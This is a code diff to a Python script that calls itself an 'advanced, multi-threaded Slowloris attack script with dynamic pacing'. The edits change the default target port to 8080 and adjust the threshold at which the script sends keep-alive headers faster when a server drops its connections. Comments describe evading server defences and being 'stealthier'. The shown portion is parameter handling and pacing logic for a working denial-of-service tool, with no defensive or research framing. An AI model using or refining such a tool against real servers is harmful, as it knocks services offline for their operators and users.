@@ -91,7 +91,7 @@ def main():
     parser = argparse.ArgumentParser(description="Advanced, multi-threaded Slowloris attack script with dynamic pacing.")
     parser.add_argument("hostname", help="The target server's hostname or IP address.")
     parser.add_argument("connections", type=int, help="The number of connections to maintain.")
-    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80).")
+    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080).")
     parser.add_argument("--header-size", type=int, default=100, help="Size of the bogus keep-alive header value (in bytes).")
     parser.add_argument("--sleep", type=int, default=15, help="Initial maximum time in seconds between sending keep-alive headers.")
     
@@ -114,9 +114,9 @@ def main():
             dropped_count = num_before_prune - num_after_prune
             
             # --- DYNAMIC PACING LOGIC ---
-            # If the server is aggressively dropping our connections (more than 5% of our pool),
+            # If the server is aggressively dropping our connections (more than 10% of our pool),
             # we decrease the sleep interval to send keep-alives more frequently.
-            if dropped_count > (args.connections * 0.05):
+            if dropped_count > (args.connections * 0.1):
                 attack_state.set_sleep(max(5, attack_state.get_sleep() - 5))
             # If connections are stable, we can be stealthier by slowly increasing the sleep interval.
             elif dropped_count == 0 and attack_state.get_sleep() < args.sleep:
